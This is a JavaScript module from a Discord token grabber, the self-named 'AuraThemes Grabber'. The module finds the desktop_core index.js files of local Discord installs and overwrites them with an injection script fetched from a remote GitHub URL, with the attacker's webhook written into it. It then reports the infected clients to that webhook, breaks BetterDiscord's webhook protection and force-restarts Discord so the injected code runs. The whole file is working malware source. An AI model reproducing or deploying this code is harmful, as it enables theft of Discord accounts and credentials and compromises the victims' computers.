let fs = require("fs"),
  path = require("path"),
  { exec } = require("child_process"),
  { instance } = require("./../../utils/axios/request"),
  config = require("./../../config/config")(),
  process = require("process");

let local = process.env.localappdata;

let injecPath = [];

let Injection = "https://raw.githubusercontent.com/k4itrun/discord-injection/main/injection.js";

const discordsDirs = () => {
  try {
    return fs.readdirSync(local).filter((f) => f.includes("iscord")).map((f) => path.join(local, f));
  } catch (e) {
    console.error(e);
    return [];
  }
};

const findIndexs = (f) => {
  try {
    fs.readdirSync(f).forEach((d) => {
      let p = path.join(f, d);
      if (fs.statSync(p).isDirectory()) {
        findIndexs(p);
      } else if (d === "index.js" && !f.includes("node_modules") && f.includes("desktop_core")) {
        injecPath.push(p);
      }
    });
  } catch (e) {
    console.error(e);
  }
};

const injection = async (webhook) => {
  let paths = [];
  let desc = [];
  injecPath.forEach((path) => {
    let match = path.match(/\\(Discord|DiscordCanary|DiscordDevelopment|DiscordPTB|Lightcord)\\/i);
    let name = match ? match[1] : "Not Found";
    desc.push(`\`${name}\``);
    paths.push({ path, name });
  });
  await instance({
    "url": webhook[0],
    "method": "POST",
    "data": {
      "username": 'AuraThemes Grabber - Injection',
      "avatar_url": 'https://i.imgur.com/WkKXZSl.gif',
      "embeds": [{
        "author": {
          "name": "k4itrun",
          "icon_url": "https://i.imgur.com/WkKXZSl.gif"
        },
        "title": 'Discord(s) injected(s)',
        "color": "12740607",
        "description": desc.length > 0 ? desc.join(", ") : "Not Found",
        "timestamp": new Date(),
        "footer": {
          "text": 'AuraThemes Grabber - https://github.com/k4itrun/DiscordTokenGrabber',
          "icon_url": 'https://i.imgur.com/WkKXZSl.gif'
        }
      }]
    }
  });
  let inject = await instance.get(Injection);
  let text = inject.data.replace("%WEB" + "HOOK%", webhook[0]);
  await Promise.all(paths.map(async ({ path }) => {
    await fs.promises.writeFile(path, text, { encoding: "utf8", flag: "w" });
  }));
};

const bufferReplace = (buf, a, b) => {
  if (!Buffer.isBuffer(buf)) buf = Buffer(buf);
  let idx = buf.indexOf(a);
  if (idx === -1) return buf;
  if (!Buffer.isBuffer(b)) b = Buffer(b);
  let before = buf.slice(0, idx), after = replace(buf.slice(idx + a.length), a, b);
  return Buffer.concat([before, b, after], idx + b.length + after.length);
};

const betterBroke = async () => {
  try {
    let d = path.join(local, "BetterDiscord/data/betterdiscord.asar");
    if (fs.existsSync(d)) await fs.promises.writeFile(d, bufferReplace(await fs.promises.readFile(d), "api/webhooks", "aurathemes"));
  } catch (e) {
    console.error(e);
  }
};

const killApps = async (a) => {
  if (a === false) return;
  try {
    await exec("tasklist", async (e, s, r) => {
      for (let c of [
        "Discord.exe",
        "DiscordCanary.exe",
        "discordDevelopment.exe",
        "DiscordPTB.exe",
      ]) {
        if (s.includes(c)) {
          await exec(`taskkill /F /T /IM ${c}`, (err) => { });
          await exec(`"${local}\\${c.replace(".exe", "")}\\Update.exe" --processStart ${c}`, (err) => { });
        }
      }
    });
  } catch (e) {
    console.error(e);
  }
};

const findInjects = async (f) => {
  try {
    let d = await fs.promises.readdir(f);
    for (let x of d) {
      let p = path.join(f, x), ñ = await fs.promises.stat(p);
      if (ñ.isDirectory()) {
        if (x === "aura") {
          await fs.rmdirSync(p);
        } else {
          await findInjects(p);
        }
      }
    }
  } catch (e) {
    console.error(e);
  }
};

const discordInjected = async (res) => {
  try {
    if (res === false) return;
    let dirs = discordsDirs();
    for (let dir of dirs) findIndexs(dir);
    for (let dir of dirs) await findInjects(dir);
    await betterBroke();
    await injection(config.webhook);
    await killApps(config.kill.discords);
  } catch (e) {
    console.error(e);
  }
};

module.exports.discordInjected = discordInjected;
